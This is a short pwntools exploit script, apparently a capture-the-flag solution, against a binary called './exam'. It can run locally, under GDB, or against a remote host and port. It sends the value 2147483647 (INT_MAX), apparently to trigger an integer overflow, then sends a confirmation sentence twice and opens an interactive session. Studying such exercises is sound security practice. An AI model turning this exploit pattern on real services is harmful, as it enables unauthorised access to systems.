from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
b *(main +306)
continue
'''.format(**locals())

exe = './exam'
elf = context.binary = ELF(exe, checksec=False)
libc = elf.libc
context.terminal = ["tmux", "splitw", "-h"]
context.log_level = 'info'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

def i2b(val: int):
    return str(val).encode()

io = start()

io.sendlineafter(b":", i2b(2147483647))
for i in range(2):
    io.sendlineafter(b":", b"I confirm that I am taking this exam between the dates 5/24/2024 and 5/27/2024. I will not disclose any information about any section of this exam.")

io.interactive()
io.close()